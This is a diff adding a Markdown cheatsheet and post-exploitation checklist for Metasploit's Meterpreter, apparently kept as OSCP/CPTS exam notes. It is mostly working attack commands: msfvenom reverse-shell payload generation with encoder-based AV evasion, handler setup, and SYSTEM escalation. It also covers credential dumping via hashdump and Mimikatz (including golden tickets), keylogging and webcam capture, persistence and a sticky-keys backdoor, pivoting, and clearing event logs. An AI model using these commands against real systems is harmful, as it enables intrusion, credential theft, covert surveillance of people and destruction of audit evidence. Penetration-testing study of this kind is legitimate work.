@@ -1,0 +1,345 @@
+# Meterpreter
+
+## Cheatsheet
+
+```bash
+# --- Payload Generation (msfvenom) ---
+
+# Windows reverse shell (staged)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe
+
+# Windows reverse shell (stageless)
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe
+
+# Linux reverse shell (staged)
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf
+
+# Linux reverse shell (stageless)
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf
+
+# PHP web shell
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php
+
+# ASP web shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp -o shell.asp
+
+# WAR (Tomcat)
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war
+
+# DLL (for DLL hijacking / injection)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o shell.dll
+
+# --- Listener Setup (msfconsole) ---
+
+# Start multi/handler listener
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; run"
+
+# --- Post-Exploitation (inside Meterpreter session) ---
+
+# System info
+sysinfo
+
+# Current user
+getuid
+
+# Elevate to SYSTEM
+getsystem
+
+# Dump SAM hashes (requires SYSTEM)
+hashdump
+
+# Dump hashes with Mimikatz
+load kiwi
+creds_all
+
+# Migrate to a stable process (e.g., explorer.exe)
+ps
+migrate <PID>
+
+# Search for files
+search -f *.txt -d C:\\Users
+
+# Download a file
+download C:\\Users\\<USER>\\Desktop\\flag.txt
+
+# Upload a file
+upload /tmp/linpeas.sh /tmp/
+
+# Drop to system shell
+shell
+
+# Background session (return to msf)
+background
+
+# Port forwarding (local)
+portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <TARGET_IP>
+
+# Route traffic through session (pivoting)
+run autoroute -s <SUBNET>/24
+
+# Take screenshot
+screenshot
+
+# Start keylogger
+keyscan_start
+keyscan_dump
+keyscan_stop
+
+# Clear event logs (Windows)
+clearev
+```
+
+---
+
+## Methodology
+
+> [!IMPORTANT]
+> Follow this checklist after landing a Meterpreter session. The goal is to stabilize, escalate, loot, and pivot.
+
+### Phase 1: Stabilize the Session
+
+- [ ] `sysinfo` — Confirm OS, architecture, hostname, domain
+- [ ] `getuid` — Check current user context
+- [ ] `ps` — List processes, find a stable long-lived process (e.g., `explorer.exe`, `svchost.exe`)
+- [ ] `migrate <PID>` — Migrate into a stable process to avoid losing the session if the exploit process dies
+- [ ] `getpid` — Confirm migration succeeded
+
+> [!CAUTION]
+> **OPSEC Warning:** Migrating to a process owned by a different user may fail or kill your session. Always migrate to a process owned by the same user.
+
+### Phase 2: Escalate Privileges
+
+- [ ] `getsystem` — Try automated SYSTEM escalation (uses named pipe impersonation / token duplication)
+- [ ] If `getsystem` fails, `background` the session and run: `use post/multi/recon/local_exploit_suggester` → `set SESSION <ID>` → `run`
+- [ ] Check for token impersonation: `use incognito` → `list_tokens -u` → `impersonate_token "<DOMAIN>\\<USER>"`
+- [ ] Check UAC status: `run post/windows/gather/win_privs` — if UAC is blocking, try `exploit/windows/local/bypassuac_*` modules
+- [ ] On Linux: `shell` → run manual [[Linux-Privilege-Escalation]] methodology
+
+### Phase 3: Credential Harvesting
+
+- [ ] `hashdump` — Dump SAM hashes (requires SYSTEM on Windows)
+- [ ] `load kiwi` → `creds_all` — Mimikatz integration, dumps all cached credentials
+- [ ] `kiwi` → `lsa_dump_sam` — SAM database dump via LSA
+- [ ] `kiwi` → `lsa_dump_secrets` — LSA secrets (may contain service account passwords)
+- [ ] `run post/windows/gather/credentials/credential_collector` — Aggregate all found creds
+- [ ] `run post/multi/gather/ssh_creds` — Grab SSH keys on Linux
+- [ ] `search -f *.config -d C:\\inetpub` — Search for web.config with connection strings
+- [ ] `search -f *.txt -d C:\\Users` — Search for password files, notes
+- [ ] `cat C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt` — PowerShell history
+
+### Phase 4: Loot the System
+
+- [ ] `download C:\\Users\\<USER>\\Desktop\\*` — Grab desktop files / flags
+- [ ] `search -f proof.txt` / `search -f flag.txt` — Find exam flags
+- [ ] `run post/windows/gather/enum_applications` — Installed software (may reveal vulns)
+- [ ] `run post/windows/gather/enum_logged_on_users` — Who else has logged in
+- [ ] `run post/windows/gather/checkvm` — Detect if target is a VM
+- [ ] `arp` — View ARP cache for network discovery
+- [ ] `netstat` — Active connections (reveals internal services/hosts)
+- [ ] `ifconfig` — Network interfaces (look for dual-homed hosts)
+- [ ] `route` — Routing table (reveals additional subnets)
+
+### Phase 5: Pivot to Internal Network
+
+- [ ] `run autoroute -s <SUBNET>/24` — Add route through the compromised host
+- [ ] `run autoroute -p` — Verify routes
+- [ ] `portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <INTERNAL_IP>` — Forward local port to internal target
+- [ ] Use `auxiliary/scanner/portscan/tcp` through the session to scan internal hosts
+- [ ] Background session and use `exploit/multi/handler` for chained sessions through the pivot
+
+### Phase 6: Persistence (if in scope)
+
+- [ ] `run persistence -U -i 10 -p <LPORT> -r <LHOST>` — User-level persistence (auto-starts on login)
+- [ ] `run post/windows/manage/enable_rdp` — Enable RDP for persistent GUI access
+- [ ] `run post/windows/manage/sticky_keys` — Sticky keys backdoor (RDP without creds)
+
+> [!CAUTION]
+> **OPSEC Warning:** Persistence mechanisms leave artifacts. Only use if explicitly in scope. `clearev` alone does not remove all traces.
+
+### Phase 7: Clean Up
+
+- [ ] `clearev` — Clear Windows event logs (Security, System, Application)
+- [ ] Remove uploaded files
+- [ ] Kill any spawned processes
+- [ ] `screenshot` — Take final screenshots for the report before exiting
+
+---
+
+## Payload Generation Reference
+
+### Common msfvenom Formats
+
+| Platform | Payload (Staged) | Format | Extension |
+|----------|-------------------|--------|-----------|
+| Windows x64 | `windows/x64/meterpreter/reverse_tcp` | `exe` | `.exe` |
+| Windows x86 | `windows/meterpreter/reverse_tcp` | `exe` | `.exe` |
+| Linux x64 | `linux/x64/meterpreter/reverse_tcp` | `elf` | `.elf` |
+| PHP | `php/meterpreter/reverse_tcp` | `raw` | `.php` |
+| ASP | `windows/meterpreter/reverse_tcp` | `asp` | `.asp` |
+| ASPX | `windows/meterpreter/reverse_tcp` | `aspx` | `.aspx` |
+| JSP/WAR | `java/jsp_shell_reverse_tcp` | `war` | `.war` |
+| Python | `python/meterpreter/reverse_tcp` | `raw` | `.py` |
+| DLL | `windows/x64/meterpreter/reverse_tcp` | `dll` | `.dll` |
+
+> [!TIP]
+> **Staged vs Stageless:** Staged payloads (`/reverse_tcp`) are smaller but need the handler to send stage 2. Stageless (`_reverse_tcp`) are larger but self-contained — use stageless if the network is unreliable or the handler might restart.
+
+### Encoding / AV Evasion
+
+```bash
+# Shikata ga nai encoder (basic, often detected now)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x64/xor_dynamic -i 5 -f exe -o shell.exe
+
+# List all encoders
+msfvenom --list encoders
+
+# List all formats
+msfvenom --list formats
+```
+
+> [!NOTE]
+> Basic msfvenom encoding is widely detected by modern AV/EDR. For real engagements, consider custom loaders, shellcode injection, or tools like Sliver/Havoc as alternatives to Metasploit.
+
+---
+
+## Core Commands
+
+| Command | Purpose |
+|---------|---------|
+| `background` | Background session, return to `msf>` prompt |
+| `sessions` | List all sessions / switch: `sessions -i <ID>` |
+| `exit` | Kill the Meterpreter session |
+| `help` | Show all available commands |
+| `info <module>` | Show info about a post module |
+| `run <module>` | Execute a post module or script |
+| `irb` | Open interactive Ruby shell |
+| `load <extension>` | Load extension (e.g., `kiwi`, `incognito`, `powershell`) |
+| `migrate <PID>` | Move Meterpreter into another process |
+| `guid` | Show session GUID |
+
+---
+
+## File System Commands
+
+| Command | Purpose |
+|---------|---------|
+| `cd <dir>` | Change directory |
+| `ls` / `dir` | List files |
+| `pwd` | Print working directory |
+| `cat <file>` | Display file contents |
+| `edit <file>` | Edit a file in-place |
+| `rm <file>` | Delete a file |
+| `mkdir <dir>` | Create a directory |
+| `rmdir <dir>` | Remove a directory |
+| `upload <src> <dst>` | Upload file to target |
+| `download <src> <dst>` | Download file from target |
+| `search -f <pattern>` | Search for files: `search -f *.txt -d C:\\Users` |
+| `checksum md5 <file>` | MD5 hash a file |
+
+---
+
+## Networking Commands
+
+| Command | Purpose |
+|---------|---------|
+| `arp` | Display ARP cache (discover hosts on local subnet) |
+| `ifconfig` / `ipconfig` | Show network interfaces |
+| `netstat` | Show active connections |
+| `route` | Display/modify routing table |
+| `portfwd add -l <LPORT> -p <RPORT> -r <IP>` | Forward local port to remote service |
+| `portfwd delete -l <LPORT>` | Remove port forward |
+| `portfwd list` | List active port forwards |
+| `resolve <hostname>` | DNS resolution on target |
+
+---
+
+## System Commands
+
+| Command | Purpose |
+|---------|---------|
+| `sysinfo` | OS, hostname, arch, domain, language |
+| `getuid` | Current user |
+| `getpid` | Current process ID |
+| `ps` | List processes |
+| `kill <PID>` | Kill a process |
+| `pkill <name>` | Kill process by name |
+| `execute -f <cmd>` | Run a command: `execute -f cmd.exe -i -H` |
+| `shell` | Drop to native OS shell |
+| `reboot` | Reboot target |
+| `shutdown` | Shutdown target |
+| `clearev` | Clear Windows event logs |
+| `getsystem` | Attempt SYSTEM privilege escalation |
+
+---
+
+## Surveillance Commands
+
+| Command | Purpose |
+|---------|---------|
+| `screenshot` | Capture desktop screenshot |
+| `screenshare` | Watch desktop in real time |
+| `keyscan_start` | Start keylogger |
+| `keyscan_dump` | Dump captured keystrokes |
+| `keyscan_stop` | Stop keylogger |
+| `record_mic <seconds>` | Record microphone audio |
+| `webcam_list` | List webcams |
+| `webcam_snap` | Take a webcam photo |
+| `webcam_stream` | Stream webcam video |
+| `idletime` | Seconds since user last interacted |
+
+> [!CAUTION]
+> **OPSEC Warning:** Surveillance commands (keylogger, webcam, screenshare) are almost certainly out of scope on exams. Only use if the Rules of Engagement explicitly permit it.
+
+---
+
+## Useful Post Modules
+
+| Module | Purpose |
+|--------|---------|
+| `post/multi/recon/local_exploit_suggester` | Suggest local privilege escalation exploits |
+| `post/windows/gather/hashdump` | Dump SAM hashes |
+| `post/windows/gather/credentials/credential_collector` | Aggregate all found credentials |
+| `post/windows/gather/enum_applications` | List installed applications |
+| `post/windows/gather/enum_logged_on_users` | List logged on / recently logged on users |
+| `post/windows/gather/checkvm` | Detect virtualization |
+| `post/windows/gather/win_privs` | Show current privileges and UAC status |
+| `post/windows/manage/enable_rdp` | Enable RDP on target |
+| `post/windows/manage/migrate` | Migrate to another process |
+| `post/multi/manage/autoroute` | Add pivot routes through session |
+| `post/multi/gather/ssh_creds` | Collect SSH keys from target |
+| `post/linux/gather/hashdump` | Dump `/etc/shadow` on Linux |
+| `post/linux/gather/enum_configs` | Gather Linux config files |
+
+> [!TIP]
+> **Pentest Tip:** Always run `local_exploit_suggester` after landing a session. It cross-references the target OS/patch level against known local exploits and saves significant manual enumeration time.
+
+---
+
+## Kiwi (Mimikatz) Extension
+
+```bash
+# Load kiwi
+load kiwi
+
+# Dump all credentials
+creds_all
+
+# Dump SAM database
+lsa_dump_sam
+
+# Dump LSA secrets
+lsa_dump_secrets
+
+# Dump Kerberos tickets
+kerberos_ticket_list
+
+# Golden ticket
+golden_ticket_create -d <DOMAIN> -u Administrator -s <DOMAIN_SID> -k <KRBTGT_HASH> -t /tmp/golden.kirbi
+```
+
+> [!IMPORTANT]
+> Kiwi commands require SYSTEM privileges. Run `getsystem` first or migrate to a SYSTEM-owned process.
+
+---
+
+#cpts #oscp #exploitation #post-exploitation #tools #windows #linux
